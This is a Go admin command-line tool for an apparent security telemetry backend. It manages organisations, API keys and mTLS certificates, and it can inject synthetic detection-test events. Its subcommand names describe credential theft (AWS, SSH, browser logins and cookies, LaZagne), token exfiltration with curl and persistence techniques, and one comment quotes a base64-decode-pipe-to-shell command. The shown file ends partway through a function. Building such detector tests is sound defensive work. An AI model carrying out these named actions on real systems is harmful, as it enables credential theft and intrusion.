package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	_ "github.com/jackc/pgx/v5/stdlib"
	"golang.org/x/crypto/bcrypt"

	"github.com/correlic/correlic-backend/internal/config"
	"github.com/correlic/correlic-backend/internal/event"
	"github.com/correlic/correlic-backend/internal/ingest"
	"github.com/correlic/correlic-backend/internal/migrate"
	"github.com/correlic/correlic-backend/internal/model"
	"github.com/correlic/correlic-backend/internal/storage"
	"github.com/correlic/correlic-backend/internal/storage/eventstore"
	"github.com/google/uuid"
)

func main() {
	if err := config.LoadDotEnvIfPresent(".env"); err != nil {
		log.Fatal(err)
	}

	// check if the number of arguments is less than 2
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}

	switch os.Args[1] {
	case "migrate":
		cmdMigrate(os.Args[2:])
	case "status":
		cmdStatus(os.Args[2:])
	case "create-org":
		cmdCreateOrg(os.Args[2:])
	case "create-service-account":
		cmdCreateServiceAccount(os.Args[2:])
	case "create-api-key":
		cmdCreateAPIKey(os.Args[2:])
	case "revoke-api-key":
		cmdRevokeAPIKey(os.Args[2:])
	case "enroll-client-cert":
		cmdEnrollClientCert(os.Args[2:])
	case "revoke-client-cert":
		cmdRevokeClientCert(os.Args[2:])
	case "revoke-agent-cert":
		cmdRevokeAgentCert(os.Args[2:])
	case "list-client-certs":
		cmdListClientCerts(os.Args[2:])
	case "list-agent-certs":
		cmdListAgentCerts(os.Args[2:])
	case "list-org-security":
		cmdListOrgSecurity(os.Args[2:])
	case "rotate-agent-cert":
		cmdRotateAgentCert(os.Args[2:])
	case "ingest-events":
		cmdIngestEvents(os.Args[2:])
	case "emit-process-exec":
		cmdEmitProcessExec(os.Args[2:])
	case "emit-base64-pipe":
		cmdEmitBase64Pipe(os.Args[2:])
	case "emit-aws-creds-read":
		cmdEmitAWSCredsRead(os.Args[2:])
	case "emit-ssh-key-read":
		cmdEmitSSHKeyRead(os.Args[2:])
	case "emit-gpg-export-secret-keys":
		cmdEmitGPGExportSecretKeys(os.Args[2:])
	case "emit-cron-persist":
		cmdEmitCronPersist(os.Args[2:])
	case "emit-systemd-persist":
		cmdEmitSystemdPersist(os.Args[2:])
	case "emit-sudo-chain":
		cmdEmitSudoChain(os.Args[2:])
	case "emit-kubeconfig-read":
		cmdEmitKubeconfigRead(os.Args[2:])
	case "emit-ssh-agent-list":
		cmdEmitSSHAgentList(os.Args[2:])
	case "emit-shell-profile-persist":
		cmdEmitShellProfilePersist(os.Args[2:])
	case "emit-curl-token-exfil":
		cmdEmitCurlTokenExfil(os.Args[2:])
	case "emit-chrome-login-data":
		cmdEmitChromeLoginData(os.Args[2:])
	case "emit-firefox-logins":
		cmdEmitFirefoxLogins(os.Args[2:])
	case "emit-browser-cookies":
		cmdEmitBrowserCookies(os.Args[2:])
	case "emit-lazagne":
		cmdEmitLazagne(os.Args[2:])
	case "emit-identity-snapshot":
		cmdEmitIdentitySnapshot(os.Args[2:])
	case "emit-git-event":
		cmdEmitGitEvent(os.Args[2:])
	case "create-user":
		cmdCreateUser(os.Args[2:])
	case "bootstrap":
		cmdBootstrap(os.Args[2:])
	default:
		usage()
		os.Exit(2)
	}
}

// usage prints the usage of the admin CLI
func usage() {
	fmt.Fprintln(os.Stderr, "Correlic admin CLI")
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "Usage:")
	fmt.Fprintln(os.Stderr, "  admin migrate up|status|down")
	fmt.Fprintln(os.Stderr, "  admin status [--api-url <url>] [--telemetry-url <url>] [--mtls-ca <path>] [--mtls-cert <path>] [--mtls-key <path>]")
	fmt.Fprintln(os.Stderr, "  admin bootstrap --name <org_name> --certs-dir <dir> [--email <admin_email>] [--agent-email <email>] [--force]")
	fmt.Fprintln(os.Stderr, "  admin create-org --name <org_name>")
	fmt.Fprintln(os.Stderr, "  admin create-user --org-id <uuid> --email <email> --name <name> --role <admin|member>")
	fmt.Fprintln(os.Stderr, "  admin create-service-account --org-id <uuid> --email <email> [--name <name>] [--role <admin|member>]")
	fmt.Fprintln(os.Stderr, "  admin create-api-key --org-id <uuid> --user-id <uuid> --name <key_name> [--type service|agent] [--description <text>]")
	fmt.Fprintln(os.Stderr, "  admin revoke-api-key --key-id <uuid>")
	fmt.Fprintln(os.Stderr, "  admin enroll-client-cert --org-id <uuid> --name <label> (--cert-file <path> | --fingerprint <hex>)")
	fmt.Fprintln(os.Stderr, "  admin revoke-client-cert --org-id <uuid> --fingerprint <hex>")
	fmt.Fprintln(os.Stderr, "  admin revoke-agent-cert --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin list-client-certs --org-id <uuid> [--limit N] [--include-revoked]")
	fmt.Fprintln(os.Stderr, "  admin list-agent-certs --org-id <uuid> [--limit N] [--include-revoked]")
	fmt.Fprintln(os.Stderr, "  admin list-org-security --org-id <uuid>")
	fmt.Fprintln(os.Stderr, "  admin rotate-agent-cert --org-id <uuid> --agent-id <agent_id> --name <label> (--cert-file <path> | --fingerprint <hex>)")
	fmt.Fprintln(os.Stderr, "  admin ingest-events  (reads JSONL from stdin; one canonical event per line)")
	fmt.Fprintln(os.Stderr, "  admin emit-process-exec --org-id <uuid> --agent-id <agent_id> --cmd <shell_cmd>")
	fmt.Fprintln(os.Stderr, "  admin emit-base64-pipe --org-id <uuid> --agent-id <agent_id> --script <shell_script>")
	fmt.Fprintln(os.Stderr, "  admin emit-aws-creds-read --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-ssh-key-read --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-gpg-export-secret-keys --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-cron-persist --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-systemd-persist --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-sudo-chain --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-kubeconfig-read --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-ssh-agent-list --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-shell-profile-persist --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-curl-token-exfil --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-chrome-login-data --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-firefox-logins --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-browser-cookies --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-lazagne --org-id <uuid> --agent-id <agent_id>")
	fmt.Fprintln(os.Stderr, "  admin emit-identity-snapshot --org-id <uuid> --agent-id <agent_id> [--ssh-fps <csv>] [--git-remotes <csv>] [--kube-contexts <csv>]")
	fmt.Fprintln(os.Stderr, "  admin emit-git-event --org-id <uuid> --agent-id <agent_id> --op <clone|remote_add|remote_set_url|push|pull|fetch> [--remote-url <url>] [--repo-path <path>] [--branch <name>] [--result <ok|error>]")
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "Environment:")
	fmt.Fprintln(os.Stderr, "  DATABASE_URL (optional): postgres connection string")
}

// cmdMigrate manages the embedded migrations:
//
//	migrate up      applies every pending migration (default when no subcommand is given)
//	migrate status  prints the applied migration names and anything still pending
//	migrate down    not supported — migrations are forward-only (exit 2)
func cmdMigrate(args []string) {
	sub := "up"
	if len(args) > 0 && !strings.HasPrefix(args[0], "-") {
		sub = args[0]
		args = args[1:]
	}
	fs := flag.NewFlagSet("migrate", flag.ExitOnError)
	_ = fs.Parse(args)

	switch sub {
	case "up":
		db, err := openDB()
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()
		pending, err := migrate.Pending(db)
		if err != nil {
			log.Fatal(err)
		}
		if err := migrate.ApplyEmbedded(db); err != nil {
			log.Fatal(err)
		}
		for _, p := range pending {
			fmt.Printf("applied=%s\n", p)
		}
		fmt.Println("migrated=true")
	case "status":
		db, err := openDB()
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()
		applied, err := migrate.ListApplied(db)
		if err != nil {
			log.Fatal(err)
		}
		pending, err := migrate.Pending(db)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("applied=%d\n", len(applied))
		for _, m := range applied {
			fmt.Printf("  %s  %s\n", m.Version, m.AppliedAt.UTC().Format(time.RFC3339))
		}
		fmt.Printf("pending=%d\n", len(pending))
		for _, p := range pending {
			fmt.Printf("  %s\n", p)
		}
	case "down":
		fmt.Fprintln(os.Stderr, "migrate down: not supported (migrations are forward-only; restore from a backup to roll back)")
		os.Exit(2)
	default:
		fmt.Fprintf(os.Stderr, "unknown migrate subcommand %q (want up|status|down)\n", sub)
		os.Exit(2)
	}
}

// cmdStatus prints the status of the system
func cmdStatus(args []string) {
	fs := flag.NewFlagSet("status", flag.ExitOnError)
	apiURL := fs.String("api-url", "https://localhost:8080", "control plane base URL")
	telemetryURL := fs.String("telemetry-url", "https://localhost:8081", "telemetry plane base URL")
	mtlsCA := fs.String("mtls-ca", "", "CA cert path for mTLS debug fetch (optional)")
	mtlsCert := fs.String("mtls-cert", "", "client cert path for mTLS debug fetch (optional)")
	mtlsKey := fs.String("mtls-key", "", "client key path for mTLS debug fetch (optional)")
	_ = fs.Parse(args)

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	var applied int
	var latest sql.NullString
	_ = db.QueryRow(`SELECT COUNT(*) FROM schema_migrations`).Scan(&applied)
	_ = db.QueryRow(`SELECT version FROM schema_migrations ORDER BY applied_at DESC, version DESC LIMIT 1`).Scan(&latest)

	out := map[string]any{
		"ts": time.Now().UTC().Format(time.RFC3339Nano),
		"db": map[string]any{
			"applied_migrations": applied,
			"latest_migration":   latest.String,
		},
		"env": map[string]any{
			"ALLOW_API_KEY_AUTH":     os.Getenv("ALLOW_API_KEY_AUTH"),
			"ENABLE_DEBUG_ENDPOINTS": os.Getenv("ENABLE_DEBUG_ENDPOINTS"),
		},
	}

	// Optional: fetch /debug/vars from planes.
	if *mtlsCA != "" && *mtlsCert != "" && *mtlsKey != "" {
		client, err := mtlsHTTPClient(*mtlsCA, *mtlsCert, *mtlsKey)
		if err != nil {
			out["debug_fetch_error"] = err.Error()
		} else {
			apiVars, apiErr := fetchDebugVars(client, *apiURL)
			telVars, telErr := fetchDebugVars(client, *telemetryURL)
			out["debug_vars"] = map[string]any{
				"api": map[string]any{
					"error": apiErrString(apiErr),
					"vars":  apiVars,
				},
				"telemetry": map[string]any{
					"error": apiErrString(telErr),
					"vars":  telVars,
				},
			}
		}
	} else {
		out["debug_vars"] = map[string]any{
			"note": "pass --mtls-ca/--mtls-cert/--mtls-key to fetch /debug/vars counters",
		}
	}

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	_ = enc.Encode(out)
}

func apiErrString(err error) any {
	if err == nil {
		return nil
	}
	return err.Error()
}

func mtlsHTTPClient(caFile, certFile, keyFile string) (*http.Client, error) {
	caPEM, err := os.ReadFile(caFile)
	if err != nil {
		return nil, err
	}
	pool := x509.NewCertPool()
	if ok := pool.AppendCertsFromPEM(caPEM); !ok {
		return nil, fmt.Errorf("invalid CA PEM")
	}
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, err
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion:   tls.VersionTLS12,
			RootCAs:      pool,
			Certificates: []tls.Certificate{cert},
		},
	}
	return &http.Client{Timeout: 5 * time.Second, Transport: tr}, nil
}

func fetchDebugVars(c *http.Client, baseURL string) (map[string]any, error) {
	req, err := http.NewRequest(http.MethodGet, strings.TrimRight(baseURL, "/")+"/debug/vars", nil)
	if err != nil {
		return nil, err
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return nil, fmt.Errorf("status=%d", resp.StatusCode)
	}
	var m map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&m); err != nil {
		return nil, err
	}
	// return full map; caller can filter.
	return m, nil
}

// openDB opens a connection to the database
func openDB() (*sql.DB, error) {
	dbURL := "postgres://correlic:correlic@localhost:5432/correlic"
	if env := os.Getenv("DATABASE_URL"); env != "" {
		dbURL = env
	}
	return sql.Open("pgx", dbURL)
}

// cmdIngestEvents reads JSONL from stdin (one event.Event per line) and appends each to the canonical events store.
func cmdIngestEvents(args []string) {
	_ = flag.NewFlagSet("ingest-events", flag.ExitOnError).Parse(args)

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	store := eventstore.NewPostgresEventStore(db)
	ctx := context.Background()
	scanner := bufio.NewScanner(os.Stdin)
	var count int
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		var evt event.Event
		if err := json.Unmarshal([]byte(line), &evt); err != nil {
			log.Fatalf("invalid JSON line: %v", err)
		}
		if err := ingest.IngestEvent(ctx, store, evt); err != nil {
			log.Fatalf("ingest event %q: %v", evt.ID, err)
		}
		count++
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("ingested=%d\n", count)
}

// cmdCreateOrg creates a new organization
func cmdCreateOrg(args []string) {
	fs := flag.NewFlagSet("create-org", flag.ExitOnError)
	name := fs.String("name", "", "organization name")
	_ = fs.Parse(args)

	if strings.TrimSpace(*name) == "" {
		log.Fatal("--name is required")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	orgID := uuid.New()
	_, err = db.Exec(`INSERT INTO organizations (id, name, created_at) VALUES ($1, $2, now())`, orgID, *name)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("org_id=%s\n", orgID.String())
}

// cmdCreateServiceAccount creates a service account user
func cmdCreateServiceAccount(args []string) {
	fs := flag.NewFlagSet("create-service-account", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	email := fs.String("email", "", "service account email (e.g., svc-ci@example.com)")
	name := fs.String("name", "", "service account name (e.g., CI/CD Pipeline)")
	role := fs.String("role", "member", "role (admin or member)")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*email) == "" {
		log.Fatal("--email is required")
	}
	if strings.TrimSpace(*name) == "" {
		*name = *email
	}

	orgID, err := uuid.Parse(*orgIDStr)
	if err != nil {
		log.Fatal("invalid --org-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	userStore := storage.NewPostgresUserStore(db)

	// Create service account
	user, err := userStore.CreateServiceAccount(*email, *name)
	if err != nil {
		log.Fatal(err)
	}

	// Add to org
	err = userStore.AddOrgUser(orgID.String(), user.ID, *role)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("user_id=%s\n", user.ID)
	fmt.Printf("email=%s\n", user.Email)
	fmt.Printf("role=%s\n", *role)
	fmt.Println("\nNext: Create an API key for this service account:")
	fmt.Printf("  go run ./cmd/admin create-api-key --org-id=%s --user-id=%s --name=\"CI Key\"\n", orgID.String(), user.ID)
}

// cmdCreateAPIKey creates a new API key
func cmdCreateAPIKey(args []string) {
	fs := flag.NewFlagSet("create-api-key", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	userIDStr := fs.String("user-id", "", "user id (uuid) - required for service accounts")
	name := fs.String("name", "", "key name")
	description := fs.String("description", "", "key description (optional)")
	keyType := fs.String("type", "service", "key type: service (dashboard/CI, carries the user's role) or agent (host agent ingest only)")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*userIDStr) == "" {
		log.Fatal("--user-id is required (tie API key to a user/service account)")
	}
	if strings.TrimSpace(*name) == "" {
		log.Fatal("--name is required")
	}
	kt := strings.ToLower(strings.TrimSpace(*keyType))
	if kt != "service" && kt != "agent" {
		log.Fatal("--type must be 'service' or 'agent'")
	}

	orgID, err := uuid.Parse(*orgIDStr)
	if err != nil {
		log.Fatal("invalid --org-id")
	}
	userID, err := uuid.Parse(*userIDStr)
	if err != nil {
		log.Fatal("invalid --user-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	// Verify user exists and is in the org. Any member may hold an agent key; admin
	// is not required for either type (the key carries the user's own role).
	var exists bool
	err = db.QueryRow(`
		SELECT EXISTS(
			SELECT 1 FROM org_users
			WHERE org_id = $1 AND user_id = $2
		)
	`, orgID, userID).Scan(&exists)
	if err != nil {
		log.Fatal(err)
	}
	if !exists {
		log.Fatal("user not found in organization")
	}

	rawKey, keyID, err := insertAPIKey(db, orgID.String(), userID.String(), *name, strings.TrimSpace(*description), kt)
	if err != nil {
		log.Fatal(err)
	}

	// Print raw key once for operator to copy into agent config.
	// Do not log raw key.
	fmt.Printf("key_id=%s\n", keyID)
	fmt.Printf("key_type=%s\n", kt)
	fmt.Printf("api_key=%s\n", rawKey)
}

// cmdRevokeAPIKey revokes an API key
func cmdRevokeAPIKey(args []string) {
	fs := flag.NewFlagSet("revoke-api-key", flag.ExitOnError)
	keyIDStr := fs.String("key-id", "", "api key id (uuid)")
	_ = fs.Parse(args)

	if strings.TrimSpace(*keyIDStr) == "" {
		log.Fatal("--key-id is required")
	}

	keyID, err := uuid.Parse(*keyIDStr)
	if err != nil {
		log.Fatal("invalid --key-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	res, err := db.Exec(`UPDATE api_keys SET revoked_at = now() WHERE id = $1 AND revoked_at IS NULL`, keyID)
	if err != nil {
		log.Fatal(err)
	}

	n, _ := res.RowsAffected()
	if n == 0 {
		log.Fatal("no active key found to revoke")
	}
	fmt.Println("revoked=true")
}

func cmdEnrollClientCert(args []string) {
	fs := flag.NewFlagSet("enroll-client-cert", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	name := fs.String("name", "", "label/name for this client cert")
	certFile := fs.String("cert-file", "", "path to PEM certificate file (leaf cert)")
	fingerprint := fs.String("fingerprint", "", "hex(SHA-256(leaf_cert_DER))")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}
	if strings.TrimSpace(*name) == "" {
		log.Fatal("--name is required")
	}
	if strings.TrimSpace(*certFile) == "" && strings.TrimSpace(*fingerprint) == "" {
		log.Fatal("either --cert-file or --fingerprint is required")
	}
	if strings.TrimSpace(*certFile) != "" && strings.TrimSpace(*fingerprint) != "" {
		log.Fatal("provide only one of --cert-file or --fingerprint")
	}

	fp := strings.TrimSpace(*fingerprint)
	if *certFile != "" {
		data, err := os.ReadFile(*certFile)
		if err != nil {
			log.Fatal(err)
		}
		certs, err := parsePEMCerts(data)
		if err != nil {
			log.Fatal(err)
		}
		if len(certs) == 0 {
			log.Fatal("no certificates found in --cert-file")
		}
		sum := sha256.Sum256(certs[0].Raw)
		fp = hex.EncodeToString(sum[:])
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	store := storage.NewPostgresClientCertStore(db)
	if err := store.Enroll(*orgIDStr, *name, fp); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("enrolled=true fingerprint=%s\n", fp)
}

func cmdRevokeClientCert(args []string) {
	fs := flag.NewFlagSet("revoke-client-cert", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	fingerprint := fs.String("fingerprint", "", "hex(SHA-256(leaf_cert_DER))")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}
	fp := strings.TrimSpace(*fingerprint)
	if fp == "" {
		log.Fatal("--fingerprint is required")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	store := storage.NewPostgresClientCertStore(db)
	ok, err := store.Revoke(*orgIDStr, fp)
	if err != nil {
		log.Fatal(err)
	}
	if !ok {
		log.Fatal("no active enrollment found to revoke")
	}
	fmt.Println("revoked=true")
}

func cmdRevokeAgentCert(args []string) {
	fs := flag.NewFlagSet("revoke-agent-cert", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	store := storage.NewPostgresAgentCertStore(db)
	ok, err := store.Revoke(*orgIDStr, *agentID)
	if err != nil {
		log.Fatal(err)
	}
	if !ok {
		log.Fatal("no active agent cert binding found to revoke")
	}
	fmt.Println("revoked=true")
}

func cmdListClientCerts(args []string) {
	fs := flag.NewFlagSet("list-client-certs", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	limit := fs.Int("limit", 200, "max results")
	includeRevoked := fs.Bool("include-revoked", false, "include revoked certs")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	store := storage.NewPostgresClientCertStore(db)
	out, err := store.List(*orgIDStr, *limit, *includeRevoked)
	if err != nil {
		log.Fatal(err)
	}
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	_ = enc.Encode(out)
}

func cmdListAgentCerts(args []string) {
	fs := flag.NewFlagSet("list-agent-certs", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	limit := fs.Int("limit", 200, "max results")
	includeRevoked := fs.Bool("include-revoked", false, "include revoked bindings")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	store := storage.NewPostgresAgentCertStore(db)
	out, err := store.List(*orgIDStr, *limit, *includeRevoked)
	if err != nil {
		log.Fatal(err)
	}
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	_ = enc.Encode(out)
}

func cmdListOrgSecurity(args []string) {
	fs := flag.NewFlagSet("list-org-security", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	var (
		clientActive  int
		clientRevoked int
		agentActive   int
		agentRevoked  int
	)

	if err := db.QueryRow(`SELECT COUNT(*) FROM org_client_certs WHERE org_id = $1 AND revoked_at IS NULL`, *orgIDStr).Scan(&clientActive); err != nil {
		log.Fatal(err)
	}
	if err := db.QueryRow(`SELECT COUNT(*) FROM org_client_certs WHERE org_id = $1 AND revoked_at IS NOT NULL`, *orgIDStr).Scan(&clientRevoked); err != nil {
		log.Fatal(err)
	}
	if err := db.QueryRow(`SELECT COUNT(*) FROM org_agent_certs WHERE org_id = $1 AND revoked_at IS NULL`, *orgIDStr).Scan(&agentActive); err != nil {
		log.Fatal(err)
	}
	if err := db.QueryRow(`SELECT COUNT(*) FROM org_agent_certs WHERE org_id = $1 AND revoked_at IS NOT NULL`, *orgIDStr).Scan(&agentRevoked); err != nil {
		log.Fatal(err)
	}

	out := map[string]any{
		"org_id": *orgIDStr,
		"client_certs": map[string]any{
			"active":  clientActive,
			"revoked": clientRevoked,
			"total":   clientActive + clientRevoked,
		},
		"agent_bindings": map[string]any{
			"active":  agentActive,
			"revoked": agentRevoked,
			"total":   agentActive + agentRevoked,
		},
	}

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	_ = enc.Encode(out)
}

func cmdRotateAgentCert(args []string) {
	fs := flag.NewFlagSet("rotate-agent-cert", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	name := fs.String("name", "", "label/name for the new client cert enrollment")
	certFile := fs.String("cert-file", "", "path to PEM certificate file (leaf cert)")
	fingerprint := fs.String("fingerprint", "", "hex(SHA-256(leaf_cert_DER))")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	if strings.TrimSpace(*name) == "" {
		log.Fatal("--name is required")
	}
	if strings.TrimSpace(*certFile) == "" && strings.TrimSpace(*fingerprint) == "" {
		log.Fatal("either --cert-file or --fingerprint is required")
	}
	if strings.TrimSpace(*certFile) != "" && strings.TrimSpace(*fingerprint) != "" {
		log.Fatal("provide only one of --cert-file or --fingerprint")
	}

	fp := strings.TrimSpace(*fingerprint)
	if *certFile != "" {
		data, err := os.ReadFile(*certFile)
		if err != nil {
			log.Fatal(err)
		}
		certs, err := parsePEMCerts(data)
		if err != nil {
			log.Fatal(err)
		}
		if len(certs) == 0 {
			log.Fatal("no certificates found in --cert-file")
		}
		sum := sha256.Sum256(certs[0].Raw)
		fp = hex.EncodeToString(sum[:])
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	clientStore := storage.NewPostgresClientCertStore(db)
	agentStore := storage.NewPostgresAgentCertStore(db)

	if err := clientStore.Enroll(*orgIDStr, *name, fp); err != nil {
		log.Fatal(err)
	}
	revoked, err := agentStore.Revoke(*orgIDStr, *agentID)
	if err != nil {
		log.Fatal(err)
	}

	out := map[string]any{
		"org_id":               *orgIDStr,
		"agent_id":             *agentID,
		"enrolled_fingerprint": fp,
		"binding_revoked":      revoked,
		"note":                 "restart agent with the new client cert to re-bind",
	}
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	_ = enc.Encode(out)
}

func parsePEMCerts(pemData []byte) ([]*x509.Certificate, error) {
	// Support single-leaf PEM files (common for local dev).
	// x509.CertPool parsing doesn't return actual cert objects, so use ParseCertificates.
	var out []*x509.Certificate
	for {
		var block *pem.Block
		block, pemData = pem.Decode(pemData)
		if block == nil {
			break
		}
		if block.Type != "CERTIFICATE" {
			continue
		}
		certs, err := x509.ParseCertificates(block.Bytes)
		if err != nil {
			return nil, err
		}
		out = append(out, certs...)
	}
	return out, nil
}

// cmdEmitProcessExec inserts a synthetic process_exec telemetry event into telemetry_events.
// This is a debugging tool to validate detector end-to-end without relying on /proc polling timing.
func cmdEmitProcessExec(args []string) {
	fs := flag.NewFlagSet("emit-process-exec", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	cmd := fs.String("cmd", "", "shell command string to run, stored as argv: [/bin/bash, -c, <cmd>]")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	if strings.TrimSpace(*cmd) == "" {
		log.Fatal("--cmd is required")
	}

	// Validate uuid format early.
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	telemetryStore := storage.NewPostgresTelemetryStore(db)

	// Minimal payload compatible with detector procExecPayload.
	payload := map[string]any{
		"pid":   999999,
		"ppid":  999998,
		"comm":  "bash",
		"argv0": "/bin/bash",
		"argv":  []string{"/bin/bash", "-c", *cmd},
	}
	raw, err := json.Marshal(payload)
	if err != nil {
		log.Fatal(err)
	}

	now := time.Now().UTC()
	ev := model.TelemetryEvent{
		AgentID:   *agentID,
		EventType: "process_exec",
		Timestamp: now,
		Payload:   raw,
	}
	if err := telemetryStore.InsertEvents(*orgIDStr, []model.TelemetryEvent{ev}); err != nil {
		log.Fatal(err)
	}

	fmt.Printf("inserted=true event_ts=%s\n", now.Format(time.RFC3339Nano))
}

// cmdEmitBase64Pipe inserts a synthetic process_exec telemetry event that should trigger
// the base64_pipe_to_shell rule: echo <b64> | base64 -d | sh
func cmdEmitBase64Pipe(args []string) {
	fs := flag.NewFlagSet("emit-base64-pipe", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
